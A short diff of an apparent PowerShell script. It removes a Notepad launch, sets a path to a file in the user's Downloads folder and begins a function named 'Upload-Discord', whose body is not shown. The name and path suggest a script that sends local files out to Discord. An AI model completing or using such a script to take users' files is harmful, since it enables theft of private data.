@@ -1,5 +1,3 @@
-Start-Process 'C:\windows\system32\notepad.exe'
-
 $path = "$env:USERPROFILE\Downloads\test.txt\"
 
 function Upload-Discord {
